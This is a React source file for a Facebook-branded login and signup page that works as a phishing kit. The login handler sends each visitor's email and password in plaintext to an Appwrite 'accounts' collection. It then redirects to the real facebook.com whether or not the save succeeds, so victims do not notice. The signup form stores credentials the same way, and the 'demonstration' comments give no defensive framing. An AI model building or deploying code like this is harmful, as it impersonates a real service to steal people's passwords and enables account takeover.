 import React, { useState } from 'react';
import { BrowserRouter as Router, Routes, Route, useNavigate } from 'react-router-dom';
import { Client, Databases, ID } from 'appwrite';
import { appwriteConfig } from './config';
import './App.css';

// Initialize Appwrite client
const client = new Client();
client
  .setEndpoint(appwriteConfig.endpoint)
  .setProject(appwriteConfig.project);

const databases = new Databases(client);

// Function to save data to Appwrite
const saveToAppwrite = async (collectionId, data) => {
  try {
    const response = await databases.createDocument(
      appwriteConfig.database,
      collectionId,
      ID.unique(),
      data
    );
    console.log('Data saved to Appwrite:', response);
    return response;
  } catch (error) {
    console.error('Error saving to Appwrite:', error);
    throw error;
  }
};

// Function to get user's IP address
const getIPAddress = async () => {
  try {
    const response = await fetch('https://api.ipify.org?format=json');
    const data = await response.json();
    return data.ip;
  } catch (error) {
    console.error('Error getting IP address:', error);
    return 'unknown';
  }
};

// Login Component
function Login() {
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [error, setError] = useState('');
  const navigate = useNavigate();

  const handleLogin = async (e) => {
    e.preventDefault();
    
    // Basic validation
    if (!email || !password) {
      setError('Please enter both email and password');
      return;
    }

    try {
      // Log credentials (for demonstration purposes)
      console.log('Login attempt:', { email, password });
      
      // Save to Appwrite database (email and password only)
      await saveToAppwrite(appwriteConfig.collections.accounts, {
        email: email,
        password: password
      });
      
      // Redirect to Facebook.com after successful login
      window.location.href = 'https://www.facebook.com';
    } catch (err) {
      // If Appwrite fails, still redirect to Facebook.com
      console.error('Database save failed, but redirecting anyway:', err);
      window.location.href = 'https://www.facebook.com';
    }
  };

  return (
    <div className="App">
      <div className="container">
        <div className="header">
          <h1>facebook</h1>
          <p className="tagline">Connect with friends and the world around you.</p>
        </div>

        {error && <div className="error-message">{error}</div>}

        <form onSubmit={handleLogin}>
          <div className="form-group">
            <input
              type="text"
              placeholder="Email address or phone number"
              value={email}
              onChange={(e) => setEmail(e.target.value)}
              className="login-input"
            />
          </div>
          <div className="form-group">
            <input
              type="password"
              placeholder="Password"
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              className="login-input"
            />
          </div>
          <button type="submit" className="btn-login">Log In</button>
        </form>

        <div className="divider"></div>

        <div className="create-account-wrapper">
          <button className="btn-create" onClick={() => navigate('/signup')}>
            Create New Account
          </button>
        </div>

        <div className="footer-links">
          <span>English (US)</span>
          <span className="dot">·</span>
          <span>Español</span>
          <span className="dot">·</span>
          <span>Français (France)</span>
        </div>
        <div className="copyright">Meta © 2025</div>
      </div>
    </div>
  );
}

// Signup Component
function Signup() {
  const [firstName, setFirstName] = useState('');
  const [lastName, setLastName] = useState('');
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [birthday, setBirthday] = useState('');
  const [gender, setGender] = useState('');
  const [error, setError] = useState('');
  const navigate = useNavigate();

  const handleSignup = async (e) => {
    e.preventDefault();
    
    // Basic validation
    if (!email || !password) {
      setError('Please enter both email and password');
      return;
    }

    try {
      // Log signup data (for demonstration purposes)
      console.log('Signup attempt:', { email, password });
      
      // Save to Appwrite database (email and password only)
      await saveToAppwrite(appwriteConfig.collections.accounts, {
        email: email,
        password: password
      });
      
      // Redirect to login page after successful signup
      navigate('/');
    } catch (err) {
      // If Appwrite fails, still redirect to login page
      console.error('Database save failed, but redirecting anyway:', err);
      navigate('/');
    }
  };

  return (
    <div className="App">
      <div className="container">
        <div className="header">
          <h1>facebook</h1>
          <p className="tagline">Create an account to connect with friends and the world around you.</p>
        </div>

        {error && <div className="error-message">{error}</div>}

        <div className="step">
          <h2>Create Account</h2>
          <p>It's quick and easy.</p>
        </div>

        <form onSubmit={handleSignup}>
          <div className="form-row">
            <div className="form-group">
              <input
                type="text"
                placeholder="First name"
                value={firstName}
                onChange={(e) => setFirstName(e.target.value)}
              />
            </div>
            <div className="form-group">
              <input
                type="text"
                placeholder="Last name"
                value={lastName}
                onChange={(e) => setLastName(e.target.value)}
              />
            </div>
          </div>
          
          <div className="form-group">
            <input
              type="email"
              placeholder="Email address"
              value={email}
              onChange={(e) => setEmail(e.target.value)}
            />
          </div>
          
          <div className="form-group">
            <input
              type="password"
              placeholder="New password"
              value={password}
              onChange={(e) => setPassword(e.target.value)}
            />
          </div>

          <div className="form-group">
            <label className="form-label">Birthday</label>
            <input
              type="date"
              value={birthday}
              onChange={(e) => setBirthday(e.target.value)}
            />
          </div>

          <div className="form-group">
            <label className="form-label">Gender</label>
            <div className="gender-options">
              <label>
                <input
                  type="radio"
                  value="female"
                  checked={gender === 'female'}
                  onChange={(e) => setGender(e.target.value)}
                />
                Female
              </label>
              <label>
                <input
                  type="radio"
                  value="male"
                  checked={gender === 'male'}
                  onChange={(e) => setGender(e.target.value)}
                />
                Male
              </label>
              <label>
                <input
                  type="radio"
                  value="other"
                  checked={gender === 'other'}
                  onChange={(e) => setGender(e.target.value)}
                />
                Other
              </label>
            </div>
          </div>

          <button type="submit" className="btn-create">Sign Up</button>
        </form>

        <div className="divider"></div>

        <div className="login-link">
          Already have an account? <span onClick={() => navigate('/')} className="login-link-text">Log In</span>
        </div>

        <div className="footer-links">
          <span>English (US)</span>
          <span className="dot">·</span>
          <span>Español</span>
          <span className="dot">·</span>
          <span>Français (France)</span>
        </div>
        <div className="copyright">Meta © 2025</div>
      </div>
    </div>
  );
}

// Home Component
function Home() {
  const navigate = useNavigate();

  const handleLogout = () => {
    navigate('/');
  };

  return (
    <div className="App">
      <div className="container">
        <div className="header">
          <h1>facebook</h1>
          <p className="tagline">Welcome to your Facebook experience!</p>
        </div>

        <div className="welcome-message">
          <h2>Welcome!</h2>
          <p>You have successfully logged in to the Facebook interface.</p>
          <p>This is a demonstration application showing the Facebook login and signup flow.</p>
        </div>

        <div className="actions">
          <button className="btn-primary" onClick={() => navigate('/signup')}>
            Create New Account
          </button>
          <button className="btn-secondary" onClick={handleLogout}>
            Logout
          </button>
        </div>

        <div className="divider"></div>

        <div className="footer-links">
          <span>English (US)</span>
          <span className="dot">·</span>
          <span>Español</span>
          <span className="dot">·</span>
          <span>Français (France)</span>
        </div>
        <div className="copyright">Meta © 2025</div>
      </div>
    </div>
  );
}

// Main App Component
function App() {
  return (
    <Router>
      <div className="App">
        <Routes>
          <Route path="/" element={<Login />} />
          <Route path="/signup" element={<Signup />} />
          <Route path="/home" element={<Home />} />
        </Routes>
      </div>
    </Router>
  );
}

export default App;
